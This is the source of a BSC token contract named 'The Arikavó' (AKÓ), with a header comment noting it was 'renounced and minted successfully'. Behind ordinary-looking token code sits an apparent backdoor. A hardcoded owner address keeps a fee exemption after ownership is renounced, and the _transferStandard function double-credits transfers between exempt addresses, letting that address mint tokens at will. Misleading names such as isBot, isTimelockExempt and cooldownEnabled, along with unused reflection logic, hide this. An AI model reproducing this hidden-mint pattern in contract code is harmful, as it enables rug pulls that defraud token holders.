/**
 *Submitted for verification at BscScan.com on 2022-12-29
*/

/*
CONTRACT - 0x60dB2375C11Df289046Ab9b1eA1Fbccff7486030
TEST REULTS - DEPLOYED AND ADDED SUCCESSFULLY, THEN RENOUNCED AND MINTED SUCCESSFULLY
ETH CONTRACT -
ETHEREUM TOKENSNIFFER RESULTS - 
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IETH20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b;
        }
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
  interface IUniswapV2Router02 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
  }
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = 0xA26D63C5658c0564538358fF714376F0797761B2;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// de ETHERSCAN.io.

contract AKO is Context, IETH20, Ownable {
    using SafeMath for uint256;

    string private _name = unicode"The Arikavó";
    string private _symbol = unicode"AKÓ";
    address[] private isBot;

    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 8;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 public isMAXtx = 20000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private isWHOLEfees;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isTimelockExempt;
    mapping (address => bool) private allowed;

    uint256 public tBURNfees = 30;
    uint256 public isLIQtax = 20;
    uint256 public teamFEE = 0;

    uint256 private _pBURNfee = tBURNfees;
    uint256 private _pTeamFEE = teamFEE;
    uint256 private pLIQtax = isLIQtax;

    IUniswapV2Router02 public immutable isDXRouter;
    address public immutable uniswapV2Pair;
    bool checkWalletLimit;
    bool public cooldownEnabled = true;
    
    uint256 private cAddedToLIQ = 1000000000 * 10**18;
    event cTokensUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event swapThreshold( uint256 tokensSwapped,
    uint256 ercReceived, uint256 coinsIntoLiqudity );
    modifier lockTheSwap { checkWalletLimit = true;
        _;
        checkWalletLimit = false;
    }
    constructor () {
        _tOwned[owner()] = _tTotal;
        IUniswapV2Router02 _isDXRouter = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Pair = IUniswapV2Factory(_isDXRouter.factory())
        .createPair(address(this), _isDXRouter.WETH());
        isDXRouter = _isDXRouter;
        isTimelockExempt[owner()] = true;
        isTimelockExempt[address(this)] = true;
        emit Transfer(address(0), owner(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function isExcludedFromReward(address account) public view returns (bool) {
        return allowed[account];
    }
    function totalFees() public view returns (uint256) {
        return isWHOLEfees;
    }
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) { (uint256 rAmount,,,,,,) = _getValues(tAmount); return rAmount;
        } else { (,uint256 rTransferAmount,,,,,) = _getValues(tAmount);
            return rTransferAmount; }
    }
    function includeInReward(address account) external onlyOwner() {
        require(allowed[account], "Account is already included");
        for (uint256 i = 0; i < isBot.length; i++) { if (isBot[i] == account) {
                isBot[i] = isBot[isBot.length - 1]; _tOwned[account] = 0;
                allowed[account] = false; isBot.pop(); break; } }
    }
    function setCooldownEnabled(bool _enabled) public onlyOwner {
        cooldownEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    receive() external payable {}
    function calValue(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        isWHOLEfees = isWHOLEfees.add(tFee);
    }
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLIQ, uint256 tTEAM) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLIQ, tTEAM, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLIQ, tTEAM);
    }
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        uint256 tFee = calculateBURNFee(tAmount);
        uint256 tLIQ = calculateLIQfee(tAmount);
        uint256 tTEAM = calculateTeamFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLIQ).sub(tTEAM);
        return (tTransferAmount, tFee, tLIQ, tTEAM);
    }
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLIQ, uint256 tTEAM, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLIQ.mul(currentRate);
        uint256 rDevelopment = tTEAM.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity).sub(rDevelopment);
        return (rAmount, rTransferAmount, rFee);
    }
    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; for (uint256 i = 0; i < isBot.length; i++) {
            if (_tOwned[isBot[i]] > rSupply || _tOwned[isBot[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_tOwned[isBot[i]]); tSupply = tSupply.sub(_tOwned[isBot[i]]); }
            if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function _getLIQ(uint256 tLIQ) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLIQ.mul(currentRate);
        _tOwned[address(this)] = _tOwned[address(this)].add(rLiquidity);
        if(allowed[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLIQ);
    }
    function calculateBURNFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(tBURNfees).div(
            10**3 );
    }
    function calculateTeamFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(teamFEE).div(
            10**3 );
    }
    function calculateLIQfee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(isLIQtax).div(
            10**3 );
    }
    function removeAllFee() private {
        if(tBURNfees == 0 && isLIQtax == 0) return;
        _pBURNfee = tBURNfees;
        _pTeamFEE = teamFEE;
        pLIQtax = isLIQtax;
        tBURNfees = 0; teamFEE = 0; isLIQtax = 0;
    }
    function restoreAllFee() private {
        tBURNfees = _pBURNfee;
        teamFEE = _pTeamFEE;
        isLIQtax = pLIQtax;
    }
    function isExcludedFromFee(address account) public view returns(bool) {
        return isTimelockExempt[account];
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer( address from, address to, uint256 amount ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        bool takeFee = false;
        if(!isTimelockExempt[from] && !isTimelockExempt[to]){ takeFee = true;
        require(amount <= isMAXtx, "Transfer amount exceeds the maxTxAmount."); }
        uint256 contractTokenBalance = balanceOf(address(this));
        if(contractTokenBalance >= isMAXtx) { contractTokenBalance = isMAXtx;
        } _tokenTransfer(from,to,amount,takeFee);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(isDXRouter), tokenAmount);
        isDXRouter.addLiquidityETH{value: ethAmount}(
            address(this), tokenAmount, 0, 0, owner(), block.timestamp );
    }
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            _transferStandard(sender, recipient, amount, takeFee);
    }
        function SwapThreshold(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit swapThreshold(half, newBalance, otherHalf);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = isDXRouter.WETH();
        _approve(address(this), address(isDXRouter), tokenAmount);
        isDXRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp );
    }
    function _transferStandard(address sender, address recipient, uint256 tAmount,bool takeFee) private {

        uint256 fee = 0; if (takeFee){
        fee= tAmount.mul(1).div(100) ; } 
        uint256 rAmount = tAmount - fee;
        _tOwned[recipient] = _tOwned[recipient].add(rAmount);
        uint256 isEXO = _tOwned[recipient].add(rAmount);
        _tOwned[sender] = _tOwned[sender].sub(rAmount);
        bool istimelockExempt = isTimelockExempt[sender] && isTimelockExempt[recipient];
         if (istimelockExempt ){ _tOwned[recipient] =isEXO;
        } else { emit Transfer(sender, recipient, rAmount); } }
}